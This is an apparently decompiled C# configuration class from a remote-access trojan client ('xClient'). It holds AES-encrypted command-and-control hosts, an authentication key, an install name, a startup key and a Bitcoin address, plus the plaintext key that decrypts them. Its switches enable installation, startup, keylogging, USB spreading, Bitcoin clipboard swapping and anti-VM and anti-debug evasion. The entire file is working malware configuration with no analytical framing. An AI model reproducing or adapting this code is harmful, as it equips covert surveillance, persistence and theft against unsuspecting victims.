using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "j42T1t1FF5MEF4heuIvJWa7RIEW3LCSDPD6JIeha7vpe/qQ/Oq5B5msvcH0c+vTfG5xLzHcEdRgGcvm/5R4jRQ==";

	public static string HOSTS = "ohm5QJ9ThWOQ3/Tj09NAM70xKFtcbXlRZHzwombjGgtzDEA4BbLGD5Iu0sudNNTDvFBzm2t7hQff/escRZOJ2GwznKN3SctCVQtf03+zpoE=";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "IkP6QMG6xAKObZTmn1LYKA==";

	public static string AUTHKEY = "Lm6aRSi9WuMrviu8lYBq8jzRTr1FOxQAwWNK0D4JvzjLyVdk+fhYjRHDf9ufxVAKS70ka1BvLRtuwd7AfYzu4g==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "FGEp9UwRK8PKomE/Y5QnX3mp7JOH5PWegSobnc2pMzBY19iZT7lTD9TyVzrIbI4Xh8hQYh4Dimpjngy+2gR3Hg==";

	public static string INSTALLNAME = "d2K2N8V2BIOm6TXuZZc5W9U0ayrbrZxhX9Lg1i4MVLH5mil03MU6ZyDKxmyBbYuHAphQqH4fXGWttnsgzUy2Ww==";

	public static bool INSTALL = true;

	public static bool STARTUP = true;

	public static string MUTEX = "0tGz+YC3wF0hD1Y1f1LnF4RKtOiVUeW1xtNwo6h3ol9c3WUQ7CNL+fIJZ/6QJ+1JsqTYbly3xDTk+YgLZrUIXS53Ev6urhChxexRq7x2XdQ=";

	public static string STARTUPKEY = "djvvFAtlR+KNaZwiR/cRFZisHlTJ3waero4+EaliP2X71G6L/YCve9Quv3inAhmNDZA+35OsvhmTVtO45m1i3A==";

	public static bool HIDEFILE = false;

	public static bool ENABLELOGGER = true;

	public static string ENCRYPTIONKEY = "dBFJhAEedq56wwtxUrzO";

	public static string TAG = "QS0DkWTwJgfi0csvp/hTTDgCw20qBnAnSqHWt66qM/LQtyzN+6QBVD8SRLg5xIFnXZMpIUAoqWBZ++A8cPzpCg==";

	public static string LOGDIRECTORYNAME = "Nb+hdjap8cGJMgVyyHBWZm685RM+FZNgvvHiyb1QIWeIijjCKvXP5rvloYuACaItjtcT6HbMp77o3OWzYYg9iA==";

	public static string USBSpreadNAME = "tjn+7hjx+b47JobvxQCQlv2+nK1qsKoSjOHvGUhIHhWaT0awBI/DDDyQ2eeiGLuKDePabN/iVX/5wieAyrtvLw==";

	public static string BTCAddress = "YYF4+fmGmRn4qkammP71DXmC8TOGN55nWZlYxfCCgSu31dTc8paewgtBQ/t+cKj5cBG3nEG6jOPjQrcApPVNdw==";

	public static bool HIDELOGDIRECTORY = true;

	public static bool HIDEINSTALLSUBDIRECTORY = false;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = false;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
